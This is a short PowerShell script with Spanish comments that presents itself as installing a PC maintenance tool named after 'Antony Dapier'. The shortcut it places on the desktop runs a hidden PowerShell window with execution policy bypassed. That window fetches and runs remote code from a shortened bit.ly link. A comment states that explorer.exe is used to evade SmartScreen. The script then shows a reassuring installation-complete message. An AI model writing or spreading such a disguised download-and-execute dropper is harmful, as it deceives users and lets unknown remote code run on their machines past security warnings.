# Script para crear el acceso directo al mantenimiento remoto
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName PresentationFramework

$Desktop = [System.Environment]::GetFolderPath('Desktop')
$ShortcutPath = Join-Path $Desktop "Optimizar PC - Antony Dapier.lnk" # Nombre del acceso directo

# Si ya existe, lo borramos para evitar conflictos de permisos
if (Test-Path $ShortcutPath) { Remove-Item $ShortcutPath -Force }

$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($ShortcutPath)

# Usamos explorer.exe como puente (Proxy) para evitar que SmartScreen bloquee el acceso directo
$Shortcut.TargetPath = "explorer.exe"
$Shortcut.Arguments = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""iex (irm https://bit.ly/mandia-windows)"""

$Shortcut.IconLocation = "imageres.dll,109" # Icono moderno de herramientas
$Shortcut.Description = "Mantenimiento y Optimización Antony Dapier"
$Shortcut.Save()

[System.Windows.MessageBox]::Show("¡Instalación completada!`n`nSe ha creado el acceso directo 'Optimizar PC - Antony Dapier' en tu escritorio. Ya puedes usar la herramienta.", "Antony Dapier - Mantenimiento", "OK", "Information")
